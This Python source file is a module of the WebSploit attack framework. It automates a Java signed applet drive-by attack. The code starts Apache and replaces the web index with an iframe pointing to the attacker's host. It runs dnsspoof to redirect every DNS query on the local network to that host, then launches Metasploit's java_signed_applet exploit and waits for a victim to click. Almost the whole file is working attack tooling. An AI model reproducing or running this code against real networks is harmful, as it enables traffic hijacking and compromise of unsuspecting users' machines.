#!/usr/bin/env python
#
# WebSploit Framework Java Signed Applet Attack module
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com

import os
import subprocess
from core import wcolors
from core import help
from time import sleep

options = ["eth0", "192.168.1.1", "Java", "Java"]
def java_applet():
	try:
		line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
		line_1 += ":"
		line_1 += wcolors.color.UNDERL + wcolors.color.BLUE + "Java_Applet" + wcolors.color.ENDC
		line_1 += " > "
		com = raw_input(line_1)
		com = com.lower()
		if com[0:13] =='set interface':
			options[0] = com[14:20]
			print "INTERFACE => ", options[0]
			java_applet()
		elif com[0:9] =='set lhost':
			options[1] = com[10:25]
			print "LHOST => ", options[1]
			java_applet()
		elif com[0:9] =='set class':
			options[2] = com[10:25]
			print "CLASS => ", options[2]
			java_applet()
		elif com[0:13] =='set publisher':
			options[3] = com[14:25]
			print "PUBLISHER => ", options[3]
			java_applet()
		elif com[0:12] =='show options':
			print ""
			print "Options\t\t Value\t\t\t\t RQ\t Description"
			print "---------\t--------------\t\t\t----\t--------------"
			print "Interface\t"+options[0]+"\t\t\t\tyes\tNetwork Interface Name"
			print "LHOST\t\t"+options[1]+"\t\t\tyes\tLocal IP Address"
			print "Class\t\t"+options[2]+"\t\t\t\tyes\tApplet's Class Name"
			print "Publisher\t"+options[3]+"\t\t\t\tyes\tPublisher's Name"
			print ""	
			java_applet()
		elif com[0:2] =='os':
			os.system(com[3:])
			java_applet()
		elif com[0:4] =='help':
			help.help()
			java_applet()
		elif com[0:4] =='back':
			pass			
		elif com[0:3] =='run':
			print(wcolors.color.BOLD + wcolors.color.BLUE + "[*]Setting Up , Wait A Few Seconds ..." + wcolors.color.ENDC)
			subprocess.Popen('/etc/init.d/apache2 start', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			sleep(2)
			os.chdir('//tmp')
			check_tmp = os.listdir(os.curdir)
			if 'fillter.dns' in check_tmp:
				os.system('rm -rf fillter.dns')
			myfillter = open('fillter.dns', 'w')
			myfillter.write(options[1] + ' *\n')
			myfillter.close()
			os.chdir('/var/www')
			check_tmp2 = os.listdir(os.curdir)
			if 'index.html' in check_tmp2:
				os.system('rm -rf index.html')
			myindex = open('index.html', 'w')
			myindex.write('<html>\n')
			myindex.write('<body>\n')
			myindex.write('<h3><center>Wait a Few Seconds ...</center></h3>\n')
			myindex.write('<center><iframe src=http://' + options[1] + ':8080/index></iframe></center>\n')
			myindex.write('</body>\n')
			myindex.write('</html>\n')
			myindex.close()
			xterm1 = 'dnsspoof -i '+ options[0] + ' -f tmp//fillter.dns'
			subprocess.Popen(xterm1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			sleep(2)
			print(wcolors.color.YELLOW + "[*]Your Index Has Been Changed...")
			print("[*]You Can Change The Index From Here => /var/www/index.html")
			print("[*]But Don\'t Forget Your IP Address, Write It In <iframe> Tag" + wcolors.color.ENDC)
			print(wcolors.color.BOLD + wcolors.color.BLUE + "[*]Engine Has Been Started ... Wait For Victim Click ..." + wcolors.color.ENDC)
			exploit = 'msfcli exploit/multi/browser/java_signed_applet APPLETNAME=' + options[2] + ' CERTCN=' + options[3] + ' URIPATH=index E'
			os.system(exploit)
		else:
			print "Wrong Command => ", com
			java_applet()
	except(KeyboardInterrupt):
		print(wcolors.color.RED + "\n[*] (Ctrl + C ) Detected, Module Exit" + wcolors.color.ENDC)	
